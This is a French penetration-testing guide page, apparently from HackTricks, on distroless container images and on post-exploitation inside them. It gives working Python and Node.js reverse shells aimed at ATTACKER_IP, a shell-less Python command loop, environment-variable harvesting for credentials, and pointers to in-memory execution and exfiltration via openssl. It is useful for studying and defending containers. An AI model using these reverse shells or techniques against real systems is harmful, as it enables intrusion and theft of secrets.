# Conteneurs Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Présentation

Une image de conteneur **distroless** est une image qui fournit les **composants d'exécution minimaux requis pour exécuter une application spécifique**, tout en supprimant volontairement les outils de distribution habituels tels que les gestionnaires de paquets, les shells et les grandes collections d'utilitaires userland génériques. En pratique, les images distroless contiennent souvent uniquement le binaire ou le runtime de l'application, ses bibliothèques partagées, les bundles de certificats et une structure de système de fichiers très réduite.

Le point n'est pas que distroless soit un nouveau primitive d'isolation du noyau. Distroless est une **stratégie de conception d'image**. Elle modifie ce qui est disponible **à l'intérieur** du système de fichiers du conteneur, pas la manière dont le noyau isole le conteneur. Cette distinction est importante, car distroless durcit l'environnement principalement en réduisant ce qu'un attaquant peut utiliser après avoir obtenu l'exécution de code. Cela ne remplace pas les namespaces, seccomp, capabilities, AppArmor, SELinux, ni aucun autre mécanisme d'isolation d'exécution.

## Pourquoi Distroless existe

Les images distroless sont principalement utilisées pour réduire :

- la taille de l'image
- la complexité opérationnelle de l'image
- le nombre de paquets et de binaires pouvant contenir des vulnérabilités
- le nombre d'outils de post-exploitation disponibles par défaut pour un attaquant

C'est pourquoi les images distroless sont populaires dans les déploiements applicatifs en production. Un conteneur qui ne contient pas de shell, pas de gestionnaire de paquets et presque aucun outil générique est généralement plus simple à raisonner opérationnellement et plus difficile à abuser de manière interactive après compromission.

Exemples de familles d'images de type distroless bien connues incluent :

- Google's distroless images
- Chainguard hardened/minimal images

## Ce que Distroless ne signifie pas

Une image distroless n'est **pas** :

- automatiquement rootless
- automatiquement non-privileged
- automatiquement en lecture seule
- automatiquement protégée par seccomp, AppArmor, ou SELinux
- automatiquement à l'abri d'une container escape

Il est toujours possible d'exécuter une image distroless avec `--privileged`, un partage de namespace du host, des bind mounts dangereux, ou un socket runtime monté. Dans ce scénario, l'image peut être minimale, mais le conteneur peut rester catastrophiquement non sécurisé. Distroless modifie la **surface d'attaque userland**, pas la **frontière de confiance du noyau**.

## Caractéristiques opérationnelles typiques

Quand vous compromettez un conteneur distroless, la première chose que vous remarquez généralement est que des hypothèses courantes cessent d'être vraies. Il peut n'y avoir aucun `sh`, aucun `bash`, aucun `ls`, aucun `id`, aucun `cat`, et parfois même pas d'environnement basé sur libc qui se comporte comme vos outils habituels l'attendent. Cela affecte à la fois l'offensive et la défense, car l'absence d'outils rend le débogage, la réponse aux incidents et la post-exploitation différents.

Les schémas les plus courants sont :

- le runtime applicatif est présent, mais presque rien d'autre
- les payloads basés sur shell échouent parce qu'il n'y a pas de shell
- les one-liners d'énumération courants échouent parce que les binaires auxiliaires manquent
- des protections du système de fichiers telles que rootfs en lecture seule ou `noexec` sur des emplacements tmpfs inscriptibles sont souvent également présentes

Cette combinaison est généralement ce qui pousse les gens à parler de "weaponizing distroless".

## Distroless et post-exploitation

Le principal défi offensif dans un environnement distroless n'est pas toujours le RCE initial. C'est souvent ce qui suit. Si la workload exploitée donne une exécution de code dans un runtime de langage tel que Python, Node.js, Java, ou Go, vous pouvez être capable d'exécuter une logique arbitraire, mais pas via les workflows centrés sur le shell qui sont courants sur d'autres cibles Linux.

Cela signifie que la post-exploitation se déplace souvent dans l'une des trois directions suivantes :

1. **Utiliser directement le runtime de langage existant** pour énumérer l'environnement, ouvrir des sockets, lire des fichiers ou stagier des payloads additionnels.
2. **Apporter vos propres outils en mémoire** si le système de fichiers est en lecture seule ou si des emplacements inscriptibles sont montés `noexec`.
3. **Abuser des binaires existants déjà présents dans l'image** si l'application ou ses dépendances incluent quelque chose d'inopinément utile.

## Abuse

### Enumerate The Runtime You Already Have

Dans de nombreux conteneurs distroless il n'y a pas de shell, mais il y a tout de même un runtime applicatif. Si la cible est un service Python, Python est présent. Si la cible est Node.js, Node est présent. Cela fournit souvent suffisamment de fonctionnalités pour énumérer des fichiers, lire des variables d'environnement, ouvrir des reverse shells, et stagier une exécution en mémoire sans jamais invoquer `/bin/sh`.

Un exemple simple avec Python :
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un exemple simple avec Node.js :
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact:

- récupération des variables d'environnement, souvent incluant des identifiants ou des points de terminaison de service
- énumération du système de fichiers sans `/bin/ls`
- identification des chemins inscriptibles et des secrets montés

### Reverse Shell sans `/bin/sh`

Si l'image ne contient pas `sh` ou `bash`, un reverse shell classique basé sur un shell peut échouer immédiatement. Dans ce cas, utilisez plutôt le runtime du langage installé.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Si `/bin/sh` n'existe pas, remplacez la ligne finale par une exécution directe de commandes via Python ou une boucle REPL Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Encore une fois, si `/bin/sh` est absent, utilisez directement les APIs filesystem, process et networking de Node au lieu de lancer un shell.

### Exemple complet : No-Shell Python Command Loop

Si l'image contient Python mais n'a pas du tout de shell, une simple boucle interactive suffit souvent pour conserver une capacité complète de post-exploitation :
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Ceci ne nécessite pas un binaire shell interactif. L'impact est effectivement le même que celui d'un shell basique du point de vue de l'attaquant : exécution de commandes, énumération, et staging de further payloads via le runtime existant.

### Exécution d'outils en mémoire

Les images Distroless sont souvent combinées avec :

- `readOnlyRootFilesystem: true`
- un tmpfs écrivable mais avec `noexec` comme `/dev/shm`
- une absence d'outils de gestion de paquets

Cette combinaison rend peu fiables les workflows classiques "download binary to disk and run it". Dans ces cas, les techniques d'exécution en mémoire deviennent la principale réponse.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Les techniques les plus pertinentes là-bas sont :

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binaires déjà présents dans l'image

Certaines images Distroless contiennent encore des binaires opérationnellement nécessaires qui deviennent utiles après compromission. Un exemple souvent observé est `openssl`, car les applications en ont parfois besoin pour des tâches liées à la crypto ou au TLS.

Un modèle de recherche rapide est :
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Si `openssl` est présent, il peut être utilisé pour :

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

L'abus exact dépend de ce qui est réellement installé, mais l'idée générale est que distroless ne signifie pas "aucun outil du tout" ; cela signifie "beaucoup moins d'outils qu'une image de distribution normale".

## Vérifications

Le but de ces vérifications est de déterminer si l'image est vraiment distroless en pratique et quels runtime ou helper binaries sont encore disponibles pour post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Ce qui est intéressant ici :

- Si aucun shell n'existe mais qu'un runtime comme Python ou Node est présent, la post-exploitation doit pivoter vers une exécution pilotée par le runtime.
- Si le système de fichiers racine est en lecture seule et que `/dev/shm` est inscriptible mais `noexec`, les techniques d'exécution en mémoire deviennent beaucoup plus pertinentes.
- Si des binaires d'aide tels que `openssl`, `busybox` ou `java` existent, ils peuvent offrir suffisamment de fonctionnalités pour amorcer un accès supplémentaire.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Espace utilisateur minimal par conception | Pas de shell, pas de gestionnaire de paquets, uniquement les dépendances de l'application/runtime | ajout de couches de débogage, sidecar shells, copie de busybox ou d'outils |
| Chainguard minimal images | Espace utilisateur minimal par conception | Surface de paquets réduite, souvent centrée sur un seul runtime ou service | utilisation de `:latest-dev` ou variantes debug, copie d'outils pendant la build |
| Kubernetes workloads using distroless images | Dépend de la configuration du Pod | Distroless n'affecte que l'espace utilisateur ; la posture de sécurité du Pod dépend toujours du Pod spec et des valeurs par défaut du runtime | ajout de containers de debug éphémères, montages host, paramètres de Pod privilégié |
| Docker / Podman running distroless images | Dépend des flags d'exécution | Système de fichiers minimal, mais la sécurité au runtime dépend toujours des flags et de la configuration du daemon | `--privileged`, partage des namespaces host, montages de socket du runtime, bind host inscriptible |

Le point clé est que distroless est une **propriété d'image**, pas une protection du runtime. Sa valeur vient de la réduction de ce qui est disponible dans le système de fichiers après compromission.

## Related Pages

Pour les contournements du système de fichiers et d'exécution en mémoire couramment nécessaires dans les environnements distroless :

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Pour l'abus lié au runtime de conteneur, aux sockets et aux montages qui s'applique toujours aux workloads distroless :

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
